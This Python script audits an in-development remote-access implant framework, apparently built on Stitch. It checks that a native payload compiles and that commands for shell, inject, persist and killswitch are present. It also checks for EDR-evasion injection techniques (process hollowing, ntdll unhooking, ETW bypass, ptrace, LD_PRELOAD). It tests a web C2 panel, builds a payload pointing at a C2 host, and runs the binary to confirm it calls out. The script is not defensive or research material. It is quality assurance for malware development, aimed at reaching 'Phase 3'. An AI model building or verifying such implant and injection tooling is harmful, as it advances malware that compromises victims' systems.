#!/usr/bin/env python3
"""
FINAL COMPREHENSIVE AUDIT - Phase 1 & 2
Real testing, no simulation - verify everything works end-to-end
"""

import os
import sys
import json
import subprocess
import time
import socket
import threading
import requests
import psutil
from pathlib import Path
import hashlib
import tempfile

class FinalAudit:
    def __init__(self):
        self.results = {
            'phase1': {
                'compilation': {},
                'binary_analysis': {},
                'commands': {},
                'networking': {},
                'encryption': {},
                'web_integration': {}
            },
            'phase2': {
                'injection_module': {},
                'techniques': {},
                'process_enum': {},
                'api_endpoints': {},
                'frontend_ui': {}
            },
            'integration': {
                'frontend_backend': {},
                'command_flow': {},
                'real_execution': {}
            }
        }
        self.issues = []
        self.critical_gaps = []
        
    def log(self, msg, level="INFO"):
        colors = {
            "INFO": "\033[94m",
            "SUCCESS": "\033[92m",
            "WARNING": "\033[93m",
            "ERROR": "\033[91m",
            "CRITICAL": "\033[95m"
        }
        reset = "\033[0m"
        print(f"{colors.get(level, '')}[{level}] {msg}{reset}")
        
    # ============= PHASE 1 AUDIT =============
    
    def audit_phase1_compilation(self):
        """Test real compilation and binary generation"""
        self.log("=" * 70, "INFO")
        self.log("PHASE 1: NATIVE PAYLOAD COMPILATION AUDIT", "INFO")
        self.log("=" * 70, "INFO")
        
        os.chdir('/workspace/native_payloads')
        
        # Clean build
        subprocess.run(['rm', '-rf', 'build', 'output'], capture_output=True)
        subprocess.run(['mkdir', '-p', 'build', 'output'], capture_output=True)
        
        # Compile
        self.log("Compiling native payload...", "INFO")
        result = subprocess.run(['bash', './build.sh'], capture_output=True, text=True)
        
        if result.returncode == 0:
            self.log("✓ Compilation successful", "SUCCESS")
            self.results['phase1']['compilation']['builds'] = True
            
            # Check binary
            binary_path = Path('/workspace/native_payloads/output/payload_native')
            if binary_path.exists():
                size = binary_path.stat().st_size
                self.log(f"✓ Binary exists: {size} bytes", "SUCCESS")
                
                # Verify it's an ELF binary
                with open(binary_path, 'rb') as f:
                    header = f.read(4)
                    if header == b'\x7fELF':
                        self.log("✓ Valid ELF binary", "SUCCESS")
                        self.results['phase1']['compilation']['valid_elf'] = True
                    else:
                        self.log("✗ Invalid binary format", "ERROR")
                        self.issues.append("Binary is not valid ELF")
                        
                # Check if executable
                if os.access(binary_path, os.X_OK):
                    self.log("✓ Binary is executable", "SUCCESS")
                    self.results['phase1']['compilation']['executable'] = True
                else:
                    self.log("✗ Binary not executable", "ERROR")
                    self.issues.append("Binary lacks execute permission")
                    
            else:
                self.log("✗ Binary not found", "ERROR")
                self.critical_gaps.append("No binary output from compilation")
        else:
            self.log(f"✗ Compilation failed: {result.stderr[:200]}", "ERROR")
            self.critical_gaps.append("Native payload won't compile")
            
    def audit_phase1_commands(self):
        """Verify all 10 commands are implemented"""
        self.log("\nPHASE 1: COMMAND IMPLEMENTATION AUDIT", "INFO")
        
        commands_file = Path('/workspace/native_payloads/core/commands.c')
        if not commands_file.exists():
            self.log("✗ commands.c missing!", "ERROR")
            self.critical_gaps.append("Commands file missing")
            return
            
        content = commands_file.read_text()
        
        required_commands = [
            ('ping', 'cmd_ping'),
            ('exec', 'cmd_exec'),
            ('sysinfo', 'cmd_sysinfo'),
            ('ps_list', 'cmd_ps_list'),
            ('shell', 'cmd_shell'),
            ('download', 'cmd_download'),
            ('upload', 'cmd_upload'),
            ('inject', 'cmd_inject'),
            ('persist', 'cmd_persist'),
            ('killswitch', 'cmd_killswitch')
        ]
        
        for name, func in required_commands:
            # Check if function exists and has implementation
            if f'int {func}(' in content:
                # Check it's not just a stub
                func_start = content.find(f'int {func}(')
                if func_start != -1:
                    func_body = content[func_start:func_start+500]
                    if 'return ERR_SUCCESS' in func_body or 'return 0' in func_body:
                        self.log(f"✓ Command {name} implemented", "SUCCESS")
                        self.results['phase1']['commands'][name] = True
                    else:
                        self.log(f"⚠️ Command {name} may be incomplete", "WARNING")
                        self.issues.append(f"Command {name} implementation unclear")
            else:
                self.log(f"✗ Command {name} missing", "ERROR")
                self.critical_gaps.append(f"Command {name} not implemented")
                
    def audit_phase1_encryption(self):
        """Verify encryption implementation"""
        self.log("\nPHASE 1: ENCRYPTION AUDIT", "INFO")
        
        # Check AES
        aes_file = Path('/workspace/native_payloads/crypto/aes.c')
        if aes_file.exists():
            content = aes_file.read_text()
            if 'aes256_encrypt_block' in content and '0x63, 0x7c' in content:  # S-box values
                self.log("✓ AES-256 implementation found", "SUCCESS")
                self.results['phase1']['encryption']['aes'] = True
            else:
                self.log("✗ AES implementation incomplete", "ERROR")
                self.issues.append("AES encryption incomplete")
        
        # Check SHA256
        sha_file = Path('/workspace/native_payloads/crypto/sha256.c')
        if sha_file.exists():
            content = sha_file.read_text()
            if 'sha256_update' in content and 'sha256_final' in content:
                self.log("✓ SHA-256 implementation found", "SUCCESS")
                self.results['phase1']['encryption']['sha256'] = True
            else:
                self.log("✗ SHA-256 implementation incomplete", "ERROR")
                self.issues.append("SHA-256 incomplete")
                
    def audit_phase1_web_integration(self):
        """Test web application integration"""
        self.log("\nPHASE 1: WEB INTEGRATION AUDIT", "INFO")
        
        # Check if web_app_real.py has native payload generation
        web_file = Path('/workspace/web_app_real.py')
        if web_file.exists():
            content = web_file.read_text()
            
            checks = {
                'Native endpoint': "data.get('type') == 'native'",
                'Native builder import': 'from native_payload_builder import native_builder',
                'Compile call': 'native_builder.compile_payload',
                'Download endpoint': '/api/download-payload'
            }
            
            for name, pattern in checks.items():
                if pattern in content:
                    self.log(f"✓ {name} integrated", "SUCCESS")
                    self.results['phase1']['web_integration'][name] = True
                else:
                    self.log(f"✗ {name} missing", "ERROR")
                    self.critical_gaps.append(f"Web integration missing: {name}")
                    
    def test_phase1_python_builder(self):
        """Test Python builder actually works"""
        self.log("\nPHASE 1: PYTHON BUILDER TEST", "INFO")
        
        try:
            sys.path.insert(0, '/workspace')
            from native_payload_builder import native_builder
            
            config = {
                'platform': 'linux',
                'c2_host': '192.168.1.100',
                'c2_port': 4433
            }
            
            self.log("Testing Python compilation...", "INFO")
            result = native_builder.compile_payload(config)
            
            if result['success']:
                self.log(f"✓ Python builder works: {result['size']} bytes", "SUCCESS")
                self.results['phase1']['compilation']['python_builder'] = True
                
                # Verify output exists
                if Path(result['path']).exists():
                    self.log(f"✓ Output file exists: {result['path']}", "SUCCESS")
                else:
                    self.log("✗ Output file doesn't exist", "ERROR")
                    self.issues.append("Python builder output missing")
            else:
                self.log(f"✗ Python builder failed: {result.get('error')}", "ERROR")
                self.critical_gaps.append("Python builder broken")
                
        except Exception as e:
            self.log(f"✗ Python builder error: {e}", "ERROR")
            self.critical_gaps.append(f"Python builder error: {e}")
            
    # ============= PHASE 2 AUDIT =============
    
    def audit_phase2_injection_module(self):
        """Verify injection module is properly integrated"""
        self.log("\n" + "=" * 70, "INFO")
        self.log("PHASE 2: INJECTION MODULE AUDIT", "INFO")
        self.log("=" * 70, "INFO")
        
        # Check core files
        injection_files = [
            '/workspace/native_payloads/inject/inject_core.c',
            '/workspace/native_payloads/inject/inject_core.h',
            '/workspace/native_payloads/inject/inject_windows.c',
            '/workspace/native_payloads/inject/inject_linux.c'
        ]
        
        for filepath in injection_files:
            if Path(filepath).exists():
                size = Path(filepath).stat().st_size
                if size > 1000:  # Substantial content
                    self.log(f"✓ {Path(filepath).name}: {size} bytes", "SUCCESS")
                    self.results['phase2']['injection_module'][Path(filepath).name] = True
                else:
                    self.log(f"✗ {Path(filepath).name} too small", "ERROR")
                    self.issues.append(f"{Path(filepath).name} appears incomplete")
            else:
                self.log(f"✗ {Path(filepath).name} missing", "ERROR")
                self.critical_gaps.append(f"Injection file missing: {filepath}")
                
    def audit_phase2_techniques(self):
        """Verify injection techniques are implemented"""
        self.log("\nPHASE 2: INJECTION TECHNIQUES AUDIT", "INFO")
        
        # Check Windows techniques
        win_file = Path('/workspace/native_payloads/inject/inject_windows.c')
        if win_file.exists():
            content = win_file.read_text()
            
            windows_techs = [
                'inject_create_remote_thread',
                'inject_process_hollowing',
                'inject_queue_user_apc',
                'inject_manual_map',
                'inject_unhook_ntdll',
                'inject_bypass_etw'
            ]
            
            for tech in windows_techs:
                if f'{tech}(' in content:
                    self.log(f"✓ Windows: {tech}", "SUCCESS")
                    self.results['phase2']['techniques'][tech] = True
                else:
                    self.log(f"✗ Windows: {tech} missing", "ERROR")
                    self.critical_gaps.append(f"Windows technique missing: {tech}")
                    
        # Check Linux techniques
        linux_file = Path('/workspace/native_payloads/inject/inject_linux.c')
        if linux_file.exists():
            content = linux_file.read_text()
            
            linux_techs = [
                'inject_ptrace',
                'inject_proc_mem',
                'inject_ld_preload',
                'inject_remote_mmap',
                'inject_remote_dlopen'
            ]
            
            for tech in linux_techs:
                if f'{tech}(' in content:
                    self.log(f"✓ Linux: {tech}", "SUCCESS")
                    self.results['phase2']['techniques'][tech] = True
                else:
                    self.log(f"✗ Linux: {tech} missing", "ERROR")
                    self.critical_gaps.append(f"Linux technique missing: {tech}")
                    
    def test_phase2_process_enumeration(self):
        """Test real process enumeration"""
        self.log("\nPHASE 2: PROCESS ENUMERATION TEST", "INFO")
        
        try:
            from injection_manager import injection_manager
            
            self.log("Enumerating processes...", "INFO")
            processes = injection_manager.enumerate_processes()
            
            if len(processes) > 0:
                self.log(f"✓ Found {len(processes)} processes", "SUCCESS")
                self.results['phase2']['process_enum']['works'] = True
                
                # Check process info completeness
                if processes[0].get('injection_score') is not None:
                    self.log("✓ Injection scoring working", "SUCCESS")
                    self.results['phase2']['process_enum']['scoring'] = True
                    
                if processes[0].get('recommended_technique'):
                    self.log("✓ Technique recommendation working", "SUCCESS")
                    self.results['phase2']['process_enum']['recommendation'] = True
                    
            else:
                self.log("✗ No processes found", "ERROR")
                self.critical_gaps.append("Process enumeration returns empty")
                
            # Test techniques
            techniques = injection_manager.get_available_techniques()
            if len(techniques) > 0:
                self.log(f"✓ {len(techniques)} techniques available", "SUCCESS")
                self.results['phase2']['process_enum']['techniques'] = True
            else:
                self.log("✗ No techniques available", "ERROR")
                self.critical_gaps.append("No injection techniques configured")
                
        except Exception as e:
            self.log(f"✗ Process enumeration error: {e}", "ERROR")
            self.critical_gaps.append(f"Process enumeration broken: {e}")
            
    def audit_phase2_api_endpoints(self):
        """Check API endpoints exist"""
        self.log("\nPHASE 2: API ENDPOINTS AUDIT", "INFO")
        
        web_file = Path('/workspace/web_app_real.py')
        if web_file.exists():
            content = web_file.read_text()
            
            endpoints = [
                '/api/inject/list-processes',
                '/api/inject/techniques',
                '/api/inject/execute',
                '/api/inject/status',
                '/api/inject/history'
            ]
            
            for endpoint in endpoints:
                if endpoint in content:
                    self.log(f"✓ Endpoint: {endpoint}", "SUCCESS")
                    self.results['phase2']['api_endpoints'][endpoint] = True
                else:
                    self.log(f"✗ Endpoint missing: {endpoint}", "ERROR")
                    self.critical_gaps.append(f"API endpoint missing: {endpoint}")
                    
    def audit_phase2_frontend(self):
        """Verify frontend UI components"""
        self.log("\nPHASE 2: FRONTEND UI AUDIT", "INFO")
        
        # Check injection UI JavaScript
        js_file = Path('/workspace/static/js/injection_ui.js')
        if js_file.exists():
            size = js_file.stat().st_size
            self.log(f"✓ injection_ui.js exists: {size} bytes", "SUCCESS")
            
            content = js_file.read_text()
            
            ui_elements = [
                'InjectionDashboard',
                'loadProcesses',
                'executeInjection',
                'process-table',
                'technique-select'
            ]
            
            for element in ui_elements:
                if element in content:
                    self.log(f"  ✓ UI element: {element}", "SUCCESS")
                    self.results['phase2']['frontend_ui'][element] = True
                else:
                    self.log(f"  ✗ UI element missing: {element}", "WARNING")
                    self.issues.append(f"UI element missing: {element}")
        else:
            self.log("✗ injection_ui.js missing", "ERROR")
            self.critical_gaps.append("Injection UI JavaScript missing")
            
        # Check native payload JS
        native_js = Path('/workspace/static/js/native_payload.js')
        if native_js.exists():
            self.log(f"✓ native_payload.js exists: {native_js.stat().st_size} bytes", "SUCCESS")
            self.results['phase1']['web_integration']['frontend_js'] = True
        else:
            self.log("✗ native_payload.js missing", "ERROR")
            self.critical_gaps.append("Native payload UI missing")
            
    # ============= INTEGRATION TESTING =============
    
    def test_frontend_backend_integration(self):
        """Test that frontend can actually talk to backend"""
        self.log("\n" + "=" * 70, "INFO")
        self.log("INTEGRATION: FRONTEND-BACKEND COMMUNICATION", "INFO")
        self.log("=" * 70, "INFO")
        
        # Check if required Python packages are installed
        required_packages = ['flask', 'flask_socketio', 'psutil', 'requests']
        missing = []
        
        for package in required_packages:
            try:
                __import__(package)
            except ImportError:
                missing.append(package)
                
        if missing:
            self.log(f"✗ Missing packages: {missing}", "ERROR")
            self.critical_gaps.append(f"Required packages not installed: {missing}")
            return
        else:
            self.log("✓ All required packages installed", "SUCCESS")
            
        # Try to start web server briefly
        self.log("Testing web server startup...", "INFO")
        env = os.environ.copy()
        env.update({
            'STITCH_ADMIN_USER': 'testadmin',
            'STITCH_ADMIN_PASSWORD': 'TestPassword123!@#',
            'STITCH_WEB_PORT': '18888'
        })
        
        # Start server
        server_proc = subprocess.Popen(
            ['python3', '/workspace/web_app_real.py'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            preexec_fn=os.setsid
        )
        
        time.sleep(5)  # Let it start
        
        if server_proc.poll() is None:
            self.log("✓ Web server starts successfully", "SUCCESS")
            self.results['integration']['frontend_backend']['server_starts'] = True
            
            # Try to access it
            try:
                response = requests.get('http://localhost:18888/', timeout=2)
                if response.status_code in [200, 302]:  # 302 is redirect to login
                    self.log("✓ Web server responds to requests", "SUCCESS")
                    self.results['integration']['frontend_backend']['server_responds'] = True
                else:
                    self.log(f"⚠️ Server returned status {response.status_code}", "WARNING")
                    self.issues.append(f"Server returns status {response.status_code}")
            except Exception as e:
                self.log(f"✗ Cannot connect to server: {e}", "ERROR")
                self.issues.append("Server doesn't respond to HTTP")
                
            # Kill server
            try:
                os.killpg(os.getpgid(server_proc.pid), 9)
            except:
                pass
        else:
            stdout, stderr = server_proc.communicate(timeout=1)
            self.log(f"✗ Server failed to start: {stderr.decode()[:200]}", "ERROR")
            self.critical_gaps.append("Web server won't start")
            
    def test_command_execution_flow(self):
        """Test that commands actually work in the compiled binary"""
        self.log("\nINTEGRATION: COMMAND EXECUTION FLOW", "INFO")
        
        binary_path = Path('/workspace/native_payloads/output/payload_native')
        if not binary_path.exists():
            self.log("✗ Binary doesn't exist for testing", "ERROR")
            return
            
        # The binary will try to connect, which will fail, but we can check it runs
        self.log("Testing binary execution...", "INFO")
        
        try:
            # Run binary with timeout (it will try to connect and fail)
            result = subprocess.run(
                [str(binary_path)],
                capture_output=True,
                timeout=2
            )
            # Timeout is expected as it tries to connect
            self.log("⚠️ Binary runs but times out (expected - no C2 server)", "WARNING")
            
        except subprocess.TimeoutExpired:
            # This is actually good - means it's running and trying to connect
            self.log("✓ Binary executes and attempts connection", "SUCCESS")
            self.results['integration']['command_flow']['binary_runs'] = True
            
        except Exception as e:
            self.log(f"✗ Binary execution failed: {e}", "ERROR")
            self.critical_gaps.append("Binary won't execute")
            
    def verify_build_system(self):
        """Verify build system includes all modules"""
        self.log("\nINTEGRATION: BUILD SYSTEM VERIFICATION", "INFO")
        
        build_script = Path('/workspace/native_payloads/build.sh')
        if build_script.exists():
            content = build_script.read_text()
            
            # Check injection module is included
            if 'inject/inject_core.c' in content:
                self.log("✓ Injection module in build system", "SUCCESS")
                self.results['integration']['build_system'] = True
            else:
                self.log("✗ Injection module not in build", "ERROR")
                self.critical_gaps.append("Injection not included in build")
                
            # Check platform-specific injection
            if 'inject/inject_linux.c' in content or 'inject/inject_windows.c' in content:
                self.log("✓ Platform injection in build", "SUCCESS")
            else:
                self.log("⚠️ Platform injection may not be included", "WARNING")
                self.issues.append("Platform injection not clearly in build")
                
    # ============= FINAL ANALYSIS =============
    
    def generate_final_report(self):
        """Generate comprehensive final report"""
        self.log("\n" + "=" * 70, "CRITICAL")
        self.log("FINAL AUDIT REPORT", "CRITICAL")
        self.log("=" * 70, "CRITICAL")
        
        # Count results
        total_checks = 0
        passed_checks = 0
        
        for phase in ['phase1', 'phase2', 'integration']:
            for category in self.results[phase].values():
                if isinstance(category, dict):
                    for key, value in category.items():
                        total_checks += 1
                        if value:
                            passed_checks += 1
                            
        self.log(f"\nOVERALL SCORE: {passed_checks}/{total_checks} checks passed", "INFO")
        
        # Critical gaps
        if self.critical_gaps:
            self.log(f"\n🚨 CRITICAL GAPS ({len(self.critical_gaps)}):", "CRITICAL")
            for gap in self.critical_gaps:
                self.log(f"  - {gap}", "ERROR")
        else:
            self.log("\n✅ NO CRITICAL GAPS FOUND", "SUCCESS")
            
        # Issues
        if self.issues:
            self.log(f"\n⚠️ ISSUES ({len(self.issues)}):", "WARNING")
            for issue in self.issues[:10]:  # Show first 10
                self.log(f"  - {issue}", "WARNING")
        
        # Phase summaries
        self.log("\nPHASE 1 STATUS:", "INFO")
        phase1_complete = (
            self.results['phase1']['compilation'].get('builds', False) and
            len([v for v in self.results['phase1']['commands'].values() if v]) >= 8 and
            self.results['phase1']['encryption'].get('aes', False)
        )
        if phase1_complete:
            self.log("  ✅ Phase 1 OPERATIONAL", "SUCCESS")
        else:
            self.log("  ❌ Phase 1 INCOMPLETE", "ERROR")
            
        self.log("\nPHASE 2 STATUS:", "INFO")
        phase2_complete = (
            len([v for v in self.results['phase2']['techniques'].values() if v]) >= 8 and
            self.results['phase2']['process_enum'].get('works', False)
        )
        if phase2_complete:
            self.log("  ✅ Phase 2 OPERATIONAL", "SUCCESS")
        else:
            self.log("  ❌ Phase 2 INCOMPLETE", "ERROR")
            
        # Final verdict
        self.log("\n" + "=" * 70, "CRITICAL")
        
        if not self.critical_gaps and phase1_complete and phase2_complete:
            self.log("🎉 BOTH PHASES FULLY OPERATIONAL AND INTEGRATED!", "SUCCESS")
            self.log("Ready to proceed to Phase 3", "SUCCESS")
            return True
        else:
            self.log("⚠️ SYSTEM HAS GAPS - FIXES NEEDED", "ERROR")
            return False
            
def main():
    auditor = FinalAudit()
    
    # Run all audits
    auditor.audit_phase1_compilation()
    auditor.audit_phase1_commands()
    auditor.audit_phase1_encryption()
    auditor.audit_phase1_web_integration()
    auditor.test_phase1_python_builder()
    
    auditor.audit_phase2_injection_module()
    auditor.audit_phase2_techniques()
    auditor.test_phase2_process_enumeration()
    auditor.audit_phase2_api_endpoints()
    auditor.audit_phase2_frontend()
    
    auditor.test_frontend_backend_integration()
    auditor.test_command_execution_flow()
    auditor.verify_build_system()
    
    # Generate report
    success = auditor.generate_final_report()
    
    # Save detailed report
    with open('/workspace/final_audit_report.json', 'w') as f:
        json.dump(auditor.results, f, indent=2)
    
    return 0 if success else 1
    
if __name__ == '__main__':
    sys.exit(main())